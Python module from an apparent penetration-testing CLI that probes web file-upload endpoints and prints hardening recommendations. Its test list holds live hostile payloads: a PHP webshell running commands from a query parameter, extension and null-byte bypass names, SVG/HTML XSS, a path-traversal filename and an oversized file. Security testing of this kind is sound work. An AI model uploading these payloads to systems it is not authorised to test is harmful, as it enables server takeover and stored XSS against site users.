"""engines/security/fileupload.py — File upload security bypass tester."""

import io
import concurrent.futures
from core.module_base import BaseModule, Option
from core.utils       import color, info, success, warn, error, section
from core.validator   import require_url

UPLOAD_PATHS = [
    "upload","api/upload","api/file","api/files","api/image",
    "api/images","api/media","api/avatar","api/attachment",
]

TESTS = [
    {
        "name":     "Valid JPEG (baseline)",
        "filename": "photo.jpg",
        "content":  bytes([0xFF,0xD8,0xFF,0xE0])+b"\x00\x10JFIF"+b"\x00"*100,
        "mime":     "image/jpeg",
        "severity": "INFO",
        "desc":     "Baseline — should be accepted",
    },
    {
        "name":     "PHP webshell",
        "filename": "shell.php",
        "content":  b"<?php echo shell_exec($_GET['cmd']); ?>",
        "mime":     "application/x-php",
        "severity": "CRITICAL",
        "desc":     "Server-side execution if accepted",
    },
    {
        "name":     "PHP with double extension",
        "filename": "image.jpg.php",
        "content":  b"<?php echo 'pwned'; ?>",
        "mime":     "image/jpeg",
        "severity": "CRITICAL",
        "desc":     "Double-extension bypass",
    },
    {
        "name":     "PHP null byte",
        "filename": "image.php\x00.jpg",
        "content":  b"<?php echo 'pwned'; ?>",
        "mime":     "image/jpeg",
        "severity": "HIGH",
        "desc":     "Null byte injection in filename",
    },
    {
        "name":     "SVG with XSS",
        "filename": "test.svg",
        "content":  b'<svg><script>alert(1)</script></svg>',
        "mime":     "image/svg+xml",
        "severity": "HIGH",
        "desc":     "SVG can execute JS when rendered",
    },
    {
        "name":     "HTML file",
        "filename": "test.html",
        "content":  b'<html><script>alert(1)</script></html>',
        "mime":     "text/html",
        "severity": "MEDIUM",
        "desc":     "Stored XSS via HTML upload",
    },
    {
        "name":     "Oversized file (8MB)",
        "filename": "big.jpg",
        "content":  b"A" * (8 * 1024 * 1024),
        "mime":     "image/jpeg",
        "severity": "MEDIUM",
        "desc":     "No file size limit — DoS/storage exhaustion",
    },
    {
        "name":     "Path traversal filename",
        "filename": "../../config.php",
        "content":  b"test",
        "mime":     "text/plain",
        "severity": "CRITICAL",
        "desc":     "Directory traversal in filename",
    },
]

SEV_C   = {"CRITICAL":"red","HIGH":"yellow","MEDIUM":"cyan","INFO":"green"}
SEV_ORD = ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]


class FileUpload(BaseModule):
    name        = "security/fileupload"
    description = "Test file upload endpoints for security bypass vulnerabilities"

    def __init__(self):
        self.options = {
            "TARGET":   Option(required=True,  description="URL or domain"),
            "ENDPOINT": Option(default="",     description="Upload path (leave blank to auto-discover)"),
        }
        super().__init__()

    def _discover(self, session, base: str) -> str | None:
        for path in UPLOAD_PATHS:
            url = f"{base.rstrip('/')}/{path}"
            try:
                resp = session.options(url, timeout=self._timeout)
                if resp.status_code not in (404, 405, 410):
                    info(f"Upload endpoint found: {url}")
                    return url
            except Exception:
                pass
        return None

    def _try_upload(self, session, url: str, test: dict) -> tuple[int | None, str]:
        try:
            files = {"file": (test["filename"], io.BytesIO(test["content"]), test["mime"])}
            resp  = session.post(url, files=files, timeout=max(self._timeout, 15))
            return resp.status_code, resp.text[:200]
        except Exception as e:
            return None, str(e)

    def run(self):
        requests = self.need_package("requests")
        target   = require_url(self.opt("TARGET"))
        endpoint = (self.opt("ENDPOINT") or "").strip()

        session = requests.Session()
        session.headers["User-Agent"] = "ReconCLI/3.0"

        # Discover or use provided endpoint
        if endpoint:
            upload_url = endpoint if endpoint.startswith("http") else f"{target.rstrip('/')}/{endpoint}"
        else:
            info("Auto-discovering upload endpoint...\n")
            upload_url = self._discover(session, target)

        if not upload_url:
            upload_url = input(color("\n  [>] Enter upload endpoint manually (or Enter to abort): ",
                                     "cyan")).strip()
            if not upload_url:
                warn("No upload endpoint provided. Aborting.")
                return
            if not upload_url.startswith("http"):
                upload_url = f"{target.rstrip('/')}/{upload_url}"

        info(f"Testing {len(TESTS)} file types on {upload_url}\n")

        dangerous_accepted = []

        for test in TESTS:
            status, body = self._try_upload(session, upload_url, test)
            sev  = test["severity"]
            c    = SEV_C.get(sev, "white")

            accepted = status in (200, 201) if status else False
            icon     = "✘" if (accepted and sev != "INFO") else "✔" if (not accepted or sev=="INFO") else "?"
            status_s = str(status) if status else "ERR"

            row = color(f"  [{icon}] [{status_s}] {test['name']:<38}", c if (accepted and sev!="INFO") else "dark")
            print(row)

            if accepted and sev != "INFO":
                dangerous_accepted.append(test)
                print(color(f"      ↳ {test['desc']}", "red"))
                self.finding(sev, f"File upload accepts: {test['name']}", test["desc"])

        print()
        if not dangerous_accepted:
            success("Upload endpoint correctly rejected all dangerous file types.")
            return

        error(f"{len(dangerous_accepted)} dangerous file type(s) accepted!")
        section("Recommendations")
        recs = [
            "Validate by MAGIC BYTES, not filename extension or MIME header",
            "Allowlist only safe types: .jpg .png .gif .webp .pdf",
            "Store uploads OUTSIDE web root or use object storage (S3, Cloudinary)",
            "Rename files server-side — never trust the original filename",
            "Enforce a file size limit (e.g. 5MB max)",
            "Serve uploads with explicit Content-Type, never execute them",
        ]
        for i, r in enumerate(recs, 1):
            print(color(f"  {i}. {r}", "white"))
        print()
